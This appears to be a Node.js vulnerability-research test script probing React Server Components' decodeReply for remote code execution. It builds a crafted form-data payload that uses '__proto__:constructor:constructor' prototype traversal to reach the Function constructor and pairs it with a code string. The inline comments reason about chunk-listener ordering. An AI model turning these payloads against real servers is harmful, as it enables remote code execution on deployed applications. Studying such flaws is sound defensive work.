/**
 * Test: Chunk timing attack
 *
 * Can we create a race/ordering scenario where:
 * 1. Get Function into chunk.value (listeners array)
 * 2. wakeChunk is called with our code string
 *
 * Looking at createModelResolver:
 *   return function (value) {
 *     for (var i = 1; i < path.length; i++) value = value[path[i]];
 *     parentObject[key] = map(response, value);
 *     ...
 *   };
 *
 * This function gets pushed to chunk.value via .then()
 * When chunk resolves, wakeChunk calls it with chunk.value
 *
 * But what if we could make the callback itself be Function?
 */

'use strict';

const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => ({});

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: Chunk ordering/timing for RCE');
console.log('='.repeat(60));
console.log('');

async function test() {
  // The vulnerable flow in wakeChunk:
  //   for (var i = 0; i < listeners.length; i++) (0, listeners[i])(value);
  //
  // listeners comes from chunk.value (populated via .then())
  // value comes from the resolved chunk value
  //
  // Normal case: listeners[i] is a callback function
  // Attack case: If listeners[i] could be Function, and value is our code...

  console.log('[1] Testing if we can influence chunk.value (listeners)');
  console.log('');

  // Chunk.prototype.then pushes resolve to chunk.value:
  //   resolve && (null === this.value && (this.value = []), this.value.push(resolve));
  //
  // resolve is whatever is passed to .then(resolve, reject)
  // In normal parsing, resolve is createModelResolver's returned function
  //
  // Question: Can we make a chunk that has Function as a listener?

  // Let's try creating inter-dependent chunks
  // Chunk 0: References chunk 1
  // Chunk 1: Resolves to Function

  // If chunk 0 depends on chunk 1, then:
  // - chunk 1 resolves first
  // - chunk 0 calls .then() on chunk 1
  // - createModelResolver's callback is pushed to chunk 1's listeners
  // - But chunk 1 is already resolved, so resolve(chunk_1_value) is called immediately

  // What if we could make chunk 0's value BE Function?
  // Then when something depends on chunk 0 and calls .then()
  // and chunk 0 resolves, wakeChunk(listeners, Function) is called
  // Where listeners is the callback functions...
  // Still not what we want

  // We need: wakeChunk(Function, "our code")
  // i.e., listeners array contains Function, value is our code

  console.log('[2] The core problem:');
  console.log('    wakeChunk(listeners, value)');
  console.log('    - listeners = chunk.value (array of callbacks)');
  console.log('    - value = resolved chunk content');
  console.log('');
  console.log('    For RCE we need:');
  console.log('    - listeners[i] = Function');
  console.log('    - value = "our code"');
  console.log('');
  console.log('    But callbacks are created by createModelResolver,');
  console.log('    not from deserialized data.');
  console.log('');

  // Let me re-examine the code flow
  // When parsing $1:__proto__:constructor:constructor from chunk 0:
  // 1. getOutlinedModel is called
  // 2. It gets chunk 1
  // 3. If chunk 1 is pending/blocked, it calls chunk1.then(resolver)
  // 4. resolver is pushed to chunk1.value array
  // 5. When chunk 1 resolves, wakeChunk(chunk1.value, chunk1.value) is called
  // 6. Each listener(chunk1_resolved_value) is called

  // So chunk1_resolved_value is {"x":1} (our chunk 1 content)
  // And listeners are resolver functions

  // WAIT - what if chunk1's value is an ARRAY that contains Function?
  // Then wakeChunk would iterate over that array!

  console.log('[3] Testing: What if chunk value is array with Function?');

  // Try payload where chunk resolves to [Function, "code"]
  // But we can't directly put Function in JSON...

  // UNLESS... we use the proto traversal to put it there!
  // Chunk 1 = {"arr": ["$2:__proto__:constructor:constructor", "return 'RCE'"]}
  // Chunk 2 = {"x":1}

  // When chunk 1 resolves, arr[0] = Function, arr[1] = "return 'RCE'"
  // Then chunk 0 references chunk 1, and when it wakes...

  const formData = new Map();

  // Chunk 0: References chunk 1 which has an array
  formData.set('0', '"$@1"');  // Reference to chunk 1

  // Chunk 1: Array where first element is Function via proto
  formData.set('1', '["$2:__proto__:constructor:constructor", "return \\"RCE\\""]');

  // Chunk 2: Any object to traverse proto from
  formData.set('2', '{"x":1}');

  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  console.log('    Payload:');
  console.log('      0: "$@1"');
  console.log('      1: ["$2:__proto__:constructor:constructor", "return \\"RCE\\""]');
  console.log('      2: {"x":1}');
  console.log('');

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('    Result:', result);
    console.log('    Result type:', typeof result);
    if (Array.isArray(result)) {
      console.log('    result[0]:', result[0]);
      console.log('    result[0] === Function:', result[0] === Function);
      console.log('    result[1]:', result[1]);
    }
  } catch (e) {
    console.log('    Error:', e.message);
  }

  console.log('');
}

test().catch(console.error);
